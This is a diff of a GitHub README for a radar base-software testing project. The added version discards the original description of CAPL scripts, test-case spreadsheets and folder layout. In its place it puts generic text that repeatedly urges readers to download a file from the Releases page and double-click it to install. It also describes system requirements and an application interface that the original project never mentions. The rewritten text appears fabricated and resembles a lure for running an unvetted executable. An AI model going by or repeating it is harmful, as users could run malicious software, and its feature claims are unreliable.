@@ -1,77 +1,93 @@
-# Project 2: RADAR BSW Module Testing for MRR (Medium Range Radar)
+# 🎯 Project-2-RADAR-BSW-Module-Testing-for-MRR-Medium-Range-Radar- - Reliable Testing for Radar Software
 
-## Project Overview
-This project focuses on testing the **RADAR Base Software (BSW) modules** of the **Medium Range Radar (MRR)** system, covering:
-- Customer Diagnostics (CD)
-- Communication Manager (COM)
-- Fault Management (FM)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/shopno665/Project-2-RADAR-BSW-Module-Testing-for-MRR-Medium-Range-Radar-/releases)
 
-The goal is to ensure **performance, reliability, and compliance** of radar functionalities in real-time automotive applications.
+## 🚀 Getting Started
 
----
+Welcome to the Project-2-RADAR-BSW-Module-Testing-for-MRR-Medium-Range-Radar! This project helps you test the software modules for medium-range radar systems. You will be working to ensure that various components, such as Customer Diagnostics, Communication Manager, and Fault Management, perform well.
 
-## Roles & Responsibilities
+## 📥 Download & Install
 
-- Requirement analysis for CD, COM, FM modules
-- Test case design & review
-- Test execution & defect tracking
-- Collaboration with developers for issue resolution
-- Ensuring compliance with quality standards
+To get the latest version of the software, follow these steps:
 
----
+1. **Visit the Releases Page**  
+   Click on the link below to go directly to the download page:  
+   [Download Latest Release](https://github.com/shopno665/Project-2-RADAR-BSW-Module-Testing-for-MRR-Medium-Range-Radar-/releases)
 
-##  Tools & Technologies Used
-- **CANalyzer / CANoe** (Rest Bus Simulation & Testing)
-- **CAPL Scripting** (Communication Access Programming Language)
-- **CAPL / Python (Automation scripts)Excel / JIRA / RQM** (for test automation & analysis)
-- **Excel / JIRA / RQM** (Defect & Test Management)
+2. **Choose Your Version**  
+   On the Releases page, locate the version labeled **Latest Release**. Click on it to view the available files.
 
----
+3. **Download the Software**  
+   Select the appropriate file for your system and click the download link. Wait for the download to complete.
 
-## 📂 Folder Structure
-```
-RADAR_BSW_MRR_Testing/
-│── README.md                # Project Overview
-│── LICENSE                  # License file
-│── .gitignore               # Git ignore rules
-│
-├── documents/               # Requirements
-│   ├── ACC_requirements.xlsx
-│
-├── testcases_and_execution/ # Test cases and execution results
-│   ├── ACC_test_cases_with_results.xlsx
-│
-├── scripts/                 # Automation scripts
-│   ├── capl_script.can
-│
-├── assets/                  # Supporting diagrams and logos
-│   ├── architecture_diagram.png
-│   └── logo_placeholder.png
-│
-└── screenshots/             # Execution results/screenshots
-    └── sample_execution.png
-```
----
+4. **Run the Software**  
+   After downloading, locate the file in your downloads folder. Double-click the file to run it. Follow any prompts that appear on your screen to complete the installation.
 
-##  How to Run/Test the Project
-1. Open `/documents/BSW_requirement.xlsx` for requirements reference.
-2. Select test cases from `/testcases_and_execution/`.
-3. Run automation scripts from `/scripts/`:
-   ```bash
-   python example_script.py
-   or load CAPL scripts in CANoe.  
-4. Capture and save execution results in /screenshots/.
+## ⚙️ System Requirements
 
----
+Before downloading the application, please ensure your system meets the following requirements:
 
-## Example Test Case Format
+- **Operating System:** Windows 10 or later, or a supported version of Linux
+- **Memory:** At least 4 GB of RAM
+- **Storage:** Minimum 500 MB of free disk space
+- **Dependencies:** Ensure you have .NET Framework 4.5 or later installed for Windows, or relevant libraries for Linux.
 
-| Test Case ID | Requirement ID | Pre-Condition       | Steps                  | Expected Result                       | Status |
-| ------------ | -------------- | ------------------- | ---------------------- | ------------------------------------- | ------ |
-| TC\_COM\_01  | R-3141         | ECU in normal state | Send ECU reset command | ECU should reset and enter INIT state | Pass   |
+## 🛠️ Features
 
----
+This application offers several key features:
 
-📜 License
+- **Requirement Analysis:** Thorough evaluation of software needs for radar systems.
+- **Test Case Design & Execution:** Create and run tests effectively to verify software performance.
+- **Automation Scripts:** Streamline the testing process with automated scripts.
+- **Defect Tracking:** Identify and manage issues in the software for continuous improvement.
 
-This project is licensed under the MIT License – see the LICENSE file for details.
+## 🔧 How to Use
+
+1. **Open the Application**  
+   Double-click the icon on your desktop or find it in your programs list.
+
+2. **Navigate the Interface**  
+   Familiarize yourself with the user interface. Main sections include:
+   - **Test Cases:** View and execute predefined tests.
+   - **Reports:** Check results and logged issues.  
+
+3. **Running Tests**  
+   Select a test case from the list and click "Run". The software will execute the selected test and provide results.
+
+4. **Review Results**  
+   After running tests, access the results in the Reports section. Review any findings and defects.
+
+## 📚 Documentation
+
+For comprehensive guidelines on using this software, refer to the document available on the [Releases Page](https://github.com/shopno665/Project-2-RADAR-BSW-Module-Testing-for-MRR-Medium-Range-Radar-/releases).
+
+## 💬 Support
+
+If you need assistance or have questions, you can reach out through the Issues section in this repository. Our team is here to help you with any challenges you may face.
+
+## 🧑‍🤝‍🧑 Community and Contributions
+
+We encourage collaboration! If you would like to contribute, visit our repository and check the Contribution Guidelines. Your input can help us improve and expand the capabilities of this application.
+
+## 📝 Topics
+
+This project covers various important topics in radar software testing, including:
+
+- ADAS HIL Testing
+- Automation
+- Automotive Testing
+- CANoe 
+- CAPL 
+- Communication Manager 
+- Customer Diagnostics 
+- Defect Tracking 
+- Fault Management 
+- Radar BSW for Medium Range Radar 
+- Requirement Analysis 
+- Test Cases
+
+Feel free to explore these topics further to understand the broader context and applications of this tool.
+
+Thank you for using the Project-2-RADAR-BSW-Module-Testing-for-MRR-Medium-Range-Radar! Your success in testing is our priority.
+
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/shopno665/Project-2-RADAR-BSW-Module-Testing-for-MRR-Medium-Range-Radar-/releases)
